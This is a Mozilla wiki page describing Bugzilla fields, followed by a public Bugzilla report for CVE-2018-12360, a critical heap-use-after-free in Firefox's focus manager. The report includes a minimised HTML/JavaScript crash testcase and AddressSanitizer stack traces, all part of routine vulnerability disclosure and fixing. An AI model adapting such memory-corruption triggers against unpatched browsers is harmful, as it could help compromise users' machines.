< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)
## Bugzilla Field Descriptions

Alias
A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.Assignee
This is the person in charge of resolving the bug. Every time this field changes, the status changes to NEW to make it easy to see which new bugs have appeared on a person's list.Blocks
This bug must be resolved before the bugs listed in this field can be resolved.Bug ID
The numeric id of a bug, unique within this entire installation of Bugzilla.CC
Users who may not have a direct role to play on this bug, but who are interested in its progress.Changed
When this bug was last updated.Classification
Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorization.Comment
Bugs have comments added to them by Bugzilla users. You can search for some text in those comments.Comment Tag
Comments can have arbitrary tags added to them to help with filtering as well as mark comments as spam or abusive.Component
Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.Creation date
When the bug was filed.Depends on
The bugs listed here must be resolved before this bug can be resolved.Duplicates
List of bugs that have been marked a duplicate of the bug currently being viewed.Keywords
Keywords are a controlled vocabulary for characterizing bugs across Products and Components. Examples of this field are `regression`, `sec-high`, and `topcrash`. Bugzilla administrators manage [the list of keywords](https://bugzilla.mozilla.org/describekeywords.cgi). If you believe you need a new keyword, [please contact the administrators to discuss](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).Mentors
Mentors are users who have offered to help the bug owner with such tasks as setting up a development environment, finding relevant information to fixing the bug, how to submit a patch for review, and finally how to get the fix committed.Needinfo
More information has been requested from specific individuals, or anyone, to move the bug forward to completion.OS
This is the operating system against which the bug was reported.Platform
This is the hardware platform against which the bug was reported (ARM, ARM64, x86, x86\_64, etc).Priority

| Priority | Description |
| --- | --- |
| **--** | No decision |
| **P1** | Fix in the current release cycle |
| **P2** | Fix in the next release cycle or the following (nightly + 1 or nightly + 2) |
| **P3** | Backlog |
| **P4** | Do not use. This priority is for the Web Platform Test bot. |
| **P5** | Will not fix, but will accept a patch |

This field describes the importance and order in which a bug should be fixed compared to other bugs. This field is utilized by the programmers/engineers/release managers/managers to prioritize the work to be done. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [priority definitions](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/priority.html), or for the main Bugzilla project, [Bugzilla:Priority\_System](/Bugzilla%3APriority_System "Bugzilla:Priority System").Product
Bugs are categorised into Products and Components. Select a Classification to narrow down this list.QA Contact
The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.Rank
Used by some groups to provide finer-grained ordering for working on bugs than afforded by the Priority field. Use of this field is restricted to the `rank-setters` group.Regressed by
This bug has been introduced by the bugs listed here.Regressions
This bug has introduced the bugs listed here.Reporter
The person who filed this bug.See Also
This allows you to refer to bugs in other bug tracker installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with a comma. You should normally use this field to refer to bugs in other bug tracker installations, or bugs which are related to, but not known to be duplicates of the bug. Bugs which are regressions should be listed in the Regressed by field (above)Severity
This field describes the impact of a bug. This field is utilized by the programmers/engineers/release managers/managers to determine the severity of issues and used as input for the priority of the bug. It should not be set by people filing bugs. See the Firefox [triage documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html) and [severity documentation](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/severity.html).

| Severity | Description |
| --- | --- |
| **--** | Default value for new bugs; bug triagers for components (ie engineers and other core project folks) are expected to update the bug's severity from this value. To avoid them missing new bugs for triage, do not alter this default when filing bugs. |
| **S1** | (Catastrophic) Blocks development/testing, may impact more than 25% of users, causes data loss, likely dot release driver, and no workaround available |
| **S2** | (Serious) Major functionality/product severely impaired or a high impact issue and a satisfactory workaround does not exist |
| **S3** | (Normal) Blocks non-critical functionality or a work around exists |
| **S4** | (Small/Trivial) minor significance, cosmetic issues, low or no impact to users |
| **N/A** | (Not Applicable) The above definitions do not apply to this bug; this value is reserved for bugs of type Task or Enhancement |

Summary
The bug summary is a short sentence which succinctly describes what the bug is about.Target Milestone
For Firefox-related bugs, when a change set (patch) lands in Mozilla-Central, the [sheriffs](/Sheriffing "Sheriffing") will set this field to the corresponding release value for the current Nightly.
Release status and tracking flags are used to mark intentions for when a fix or other patch should land.
If you need to track a bug against a set of milestones other than upcoming versions of Firefox, please tell the Bugzilla team, you may want a custom status flag.Triage Owner
User that is responsible [for triaging bugs in a specific component](https://firefox-source-docs.mozilla.org/bug-mgmt/policies/triage-bugzilla.html).Type
This field describes the [type of a bug](https://firefox-source-docs.mozilla.org/bug-mgmt/guides/bug-types.html).

| Type | Description |
| --- | --- |
| **defect** | regression, crash, hang, security vulnerability and any other general issue. |
| **enhancement** | new feature, improvement in UI, performance, etc. and any other request for user-facing changes and enhancements in the product; not engineering changes |
| **task** | refactoring, removal, replacement, enabling or disabling of functionality and any other engineering task |

URL
Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.Version
The version field defines the version of the software the bug was found in.Votes
Some bugs can be voted for, and you can limit your search to bugs with more than a certain number of votes. Votes are not used by Mozilla developers to set priorities.Whiteboard
Each bug has a free-form single line text entry box for adding tags and status information

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&oldid=1250790>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FBugFields "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/BugFields "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/BugFields&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/BugFields)
* [View source](/index.php?title=BMO/UserGuide/BugFields&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/BugFields&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/BugFields "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/BugFields "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/BugFields&oldid=1250790 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/BugFields&action=info "More information about this page")

* This page was last edited on 14 May 2024, at 14:22.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/BugFields&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from bugzilla.mozilla.org_69b65d29_20250126_073632.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1459693)
* [XML](/show_bug.cgi?ctype=xml&id=1459693)

Closed
[Bug 1459693](/show_bug.cgi?id=1459693)
(CVE-2018-12360)

Opened 7 years ago
Closed 7 years ago

# heap-use-after-free in nsFocusManager::CheckIfFocusable

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

heap-use-after-free in nsFocusManager::CheckIfFocusable

## Categories

### (Core :: DOM: Core & HTML, defect, P1)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=DOM%3A%20Core%20%26%20HTML#DOM%3A%20Core%20%26%20HTML)

DOM: Core & HTML
▾

Core :: DOM: Core & HTML
Issues in DOM tree [https://dom.spec.whatwg.org](https://dom.spec.whatwg.org/) & HTML [https://html.spec.whatwg.org](https://html.spec.whatwg.org/) that do not fit into any other DOM or HTML component or which span multiple DOM or HTML components.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Core%20%26%20HTML&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=DOM%3A%20Core%20%26%20HTML&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=DOM%3A%20Core%20%26%20HTML)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

61 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla62

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| a11y-review | --- |
| --- | --- |
| Webcompat Priority | --- |
| Accessibility Severity | --- |
| Performance Impact | --- |
| Webcompat Score | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr52 | [61+](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=61%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=fixed) |
| firefox-esr60 | [61+](/buglist.cgi?f1=cf_tracking_firefox_esr60&o1=equals&v1=61%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=fixed) |
| firefox60 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox60&o1=equals&v1=wontfix) |
| firefox61 | [+](/buglist.cgi?f1=cf_tracking_firefox61&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox61&o1=equals&v1=verified) |
| firefox62 | [+](/buglist.cgi?f1=cf_tracking_firefox62&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox62&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr52 | 61+ | fixed |
| firefox-esr60 | 61+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox60 |  | wontfix |
| firefox61 | + | verified |
| firefox62 | + | verified |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: nils, Assigned: smaug, NeedInfo)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/056757eff6ed7c8ec26f61e3bf7695fe?d=mm&size=40)  [smaug](/user_profile?user_id=39966)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/1ac8e01cc88bca015e51fbd49a0b2df5?d=mm&size=40)  [nils](/user_profile?user_id=344130)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/5111b810214a00377104f5ad3efefa26?d=mm&size=40)  [sefeng](/user_profile?user_id=625922)

NeedInfo From:

 [nils](/user_profile?user_id=344130)

[7 years ago](#c20)

[NeedInfo:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#needinfo)

Update

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

13 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: csectype-uaf, reporter-external, sec-critical, Whiteboard: [adv-main61+][adv-esr52.9+][adv-esr60.1+][post-critsmash-triage])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2018-12360

[Keywords:](/describekeywords.cgi)

[csectype-uaf](/buglist.cgi?keywords=csectype-uaf&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[adv-main61+][adv-esr52.9+][adv-esr60.1+][post-critsmash-triage]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a11486977_1689 "6 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (3 files)

| [crash.html (minimised testcase)](/attachment.cgi?id=8973767)  [7 years ago](#c0)  [Nils](/user_profile?user_id=344130)   832 bytes, text/html |  | [Details](/attachment.cgi?id=8973767&action=edit) |
| --- | --- | --- |
| [ASAN output](/attachment.cgi?id=8973768)  [7 years ago](#c1)  [Nils](/user_profile?user_id=344130)   22.03 KB, text/plain |  | [Details](/attachment.cgi?id=8973768&action=edit) |
| [focus\_crash.diff](/attachment.cgi?id=8973850)  [7 years ago](#c4)  [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966)   837 bytes, patch | mccr8 : [review+](#c5 "7 years ago")  RyanVM : [approval-mozilla-beta+](#c12 "7 years ago")  RyanVM : [approval-mozilla-esr52+](#c12 "7 years ago")  RyanVM : [approval-mozilla-esr60+](#c12 "7 years ago")  abillings : [sec-approval+](#a172394_280903 "7 years ago") | [Details](/attachment.cgi?id=8973850&action=edit) | [Diff](/attachment.cgi?id=8973850&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1459693&attachment=8973850) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Nils](/user_profile?user_id=344130)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1459693#c0)• 7 years ago |
|  | |

Attached file
[crash.html (minimised testcase)](attachment.cgi?id=8973767)
— [Details](attachment.cgi?id=8973767&action=edit)

The following testcase crashes a fuzzing build (--enable-fuzzing) of Firefox 61.0a1 (SourceStamp=b1628ac71fcc15797baec6083650bfcde650f190). It requires the fuzzing.enabled pref to be set to true.
<script>
function start() {
document.removeChild(document.documentElement);
o0=document.createElement('HTML');
o1144=document.createElement('LI');
o1340=document.createElement('A');
o1144.appendChild(o1340);
o0.appendChild(o1144);
document.appendChild(o0);
window.top.setTimeout(fun0, 400);
}
function fun0() {
o1662=document.createElement('input');
o1662.type='number';
o1340.appendChild(o1662);
o1711=document.createElement('textarea');
o0.appendChild(o1711);
o1711.select();
o1718=document.createElement('marquee');
o0.addEventListener('DOMAttrModified',fun1);
o0.appendChild(o1718);
o1662.focus();
}
function fun1() {
o0.remove();
FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect();FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect();
}
</script>
<body onload="start()"></body>
ASAN output:
=================================================================
==10502==ERROR: AddressSanitizer: heap-use-after-free on address 0x61500021439c at pc 0x7f6e33e45849 bp 0x7ffe54addfb0 sp 0x7ffe54addfa8
READ of size 4 at 0x61500021439c thread T0 (file:// Content)
#0 0x7f6e33e45848 in GetBoolFlag /builds/worker/workspace/build/src/dom/base/nsINode.h:1644:12
#1 0x7f6e33e45848 in IsInUncomposedDoc /builds/worker/workspace/build/src/dom/base/nsINode.h:654
#2 0x7f6e33e45848 in GetPrimaryFrame /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIContent.h:699
#3 0x7f6e33e45848 in GetPrimaryFrame /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Element.h:1438
#4 0x7f6e33e45848 in nsFocusManager::CheckIfFocusable(mozilla::dom::Element\*, unsigned int) /builds/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1624
#5 0x7f6e33e40fed in nsFocusManager::SetFocusInner(mozilla::dom::Element\*, int, bool, bool) /builds/worker/workspace/build/src/dom/base/nsFocusManager.cpp:1226:36
#6 0x7f6e33e445ca in nsFocusManager::SetFocus(mozilla::dom::Element\*, unsigned int) /builds/worker/workspace/build/src/dom/base/nsFocusManager.cpp:518:3
#7 0x7f6e33bd0752 in mozilla::dom::Element::Focus(mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/base/Element.cpp:348:20
#8 0x7f6e36bdf023 in mozilla::dom::HTMLInputElement::Focus(mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:3198:27
#9 0x7f6e36bdeb7f in mozilla::dom::HTMLInputElement::Focus(mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/HTMLInputElement.cpp:3182:22
#10 0x7f6e35d7fad2 in mozilla::dom::HTMLElementBinding::focus(JSContext\*, JS::Handle<JSObject\*>, nsGenericHTMLElement\*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLElementBinding.cpp:540:9
#11 0x7f6e36240b21 in bool mozilla::dom::binding\_detail::GenericMethod<mozilla::dom::binding\_detail::NormalThisPolicy, mozilla::dom::binding\_detail::ThrowExceptions>(JSContext\*, unsigned int, JS::Value\*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3260:13
#12 0x7f6e3cb05ff7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15
#13 0x7f6e3cb05ff7 in js::InternalCallOrConstruct(JSContext\*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467
#14 0x7f6e3caf06bf in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12
#15 0x7f6e3caf06bf in Interpret(JSContext\*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086
#16 0x7f6e3cad6d63 in js::RunScript(JSContext\*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:417:12
#17 0x7f6e3cb05d75 in js::InternalCallOrConstruct(JSContext\*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:489:15
#18 0x7f6e3cb06ff2 in js::Call(JSContext\*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:535:10
#19 0x7f6e3d637c2a in JS::Call(JSContext\*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2989:12
#20 0x7f6e35b86e9d in mozilla::dom::Function::Call(JSContext\*, JS::Handle<JS::Value>, nsTArray<JS::Value> const&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/FunctionBinding.cpp:40:8
#21 0x7f6e33ac3bdb in Call<nsCOMPtr<nsISupports> > /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/FunctionBinding.h:73:12
#22 0x7f6e33ac3bdb in nsGlobalWindowInner::RunTimeoutHandler(mozilla::dom::Timeout\*, nsIScriptContext\*) /builds/worker/workspace/build/src/dom/base/nsGlobalWindowInner.cpp:6658
#23 0x7f6e33ce1456 in mozilla::dom::TimeoutManager::RunTimeout(mozilla::TimeStamp const&, mozilla::TimeStamp const&) /builds/worker/workspace/build/src/dom/base/TimeoutManager.cpp:877:42
#24 0x7f6e33ce0734 in mozilla::dom::TimeoutExecutor::MaybeExecute() /builds/worker/workspace/build/src/dom/base/TimeoutExecutor.cpp:172:11
#25 0x7f6e33ce2936 in Notify /builds/worker/workspace/build/src/dom/base/TimeoutExecutor.cpp:240:5
#26 0x7f6e33ce2936 in non-virtual thunk to mozilla::dom::TimeoutExecutor::Notify(nsITimer\*) /builds/worker/workspace/build/src/dom/base/TimeoutExecutor.cpp
#27 0x7f6e30babd9b in nsTimerImpl::Fire(int) /builds/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:704:40
#28 0x7f6e30b7b429 in nsTimerEvent::Run() /builds/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:290:11
#29 0x7f6e30b97c87 in mozilla::ThrottledEventQueue::Inner::ExecuteRunnable() /builds/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:188:22
#30 0x7f6e30b978bf in mozilla::ThrottledEventQueue::Inner::Executor::Run() /builds/worker/workspace/build/src/xpcom/threads/ThrottledEventQueue.cpp:72:15
#31 0x7f6e30b6c641 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:337:32
#32 0x7f6e30b8b439 in nsThread::ProcessNextEvent(bool, bool\*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1090:14
#33 0x7f6e30ba6e70 in NS\_ProcessNextEvent(nsIThread\*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:519:10
#34 0x7f6e31a859e6 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate\*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:125:5
#35 0x7f6e319d94f9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:326:10
#36 0x7f6e319d94f9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:319
#37 0x7f6e319d94f9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:299
#38 0x7f6e385a8e4a in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27
#39 0x7f6e3c81cf9b in XRE\_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22
#40 0x7f6e319d94f9 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:326:10
#41 0x7f6e319d94f9 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:319
#42 0x7f6e319d94f9 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:299
#43 0x7f6e3c81c960 in XRE\_InitChildProcess(int, char\*\*, XREChildData const\*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:719:34
#44 0x4f50dc in content\_process\_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:50:30
#45 0x4f50dc in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280
#46 0x7f6e507d882f in \_\_libc\_start\_main (/lib/x86\_64-linux-gnu/libc.so.6+0x2082f)
#47 0x42476c in \_start (/fuzzer3/firefox/firefox+0x42476c)
0x61500021439c is located 28 bytes inside of 472-byte region [0x615000214380,0x615000214558)
freed by thread T0 (file:// Content) here:
#0 0x4c5172 in \_\_interceptor\_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan\_malloc\_linux.cc:68:3
#1 0x7f6e30a18f30 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2729:25
#2 0x7f6e30a2114f in FreeSnowWhite /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2917:3
#3 0x7f6e30a2114f in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener\*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3925
#4 0x7f6e30a2065d in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener\*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3746:9
#5 0x7f6e30a244f2 in nsCycleCollector\_collect(nsICycleCollectorListener\*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4315:21
#6 0x7f6e33ec20de in nsJSContext::CycleCollectNow(nsICycleCollectorListener\*) /builds/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1488:3
#7 0x7f6e35c574ca in mozilla::dom::FuzzingFunctionsBinding::cycleCollect(JSContext\*, unsigned int, JS::Value\*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/FuzzingFunctionsBinding.cpp:54:3
#8 0x7f6e3cb05ff7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:280:15
#9 0x7f6e3cb05ff7 in js::InternalCallOrConstruct(JSContext\*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467
#10 0x7f6e3caf06bf in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12
#11 0x7f6e3caf06bf in Interpret(JSContext\*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3086
#12 0x7f6e3cad6d63 in js::RunScript(JSContext\*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:417:12
#13 0x7f6e3cb05d75 in js::InternalCallOrConstruct(JSContext\*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:489:15
#14 0x7f6e3cb06ff2 in js::Call(JSContext\*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:535:10
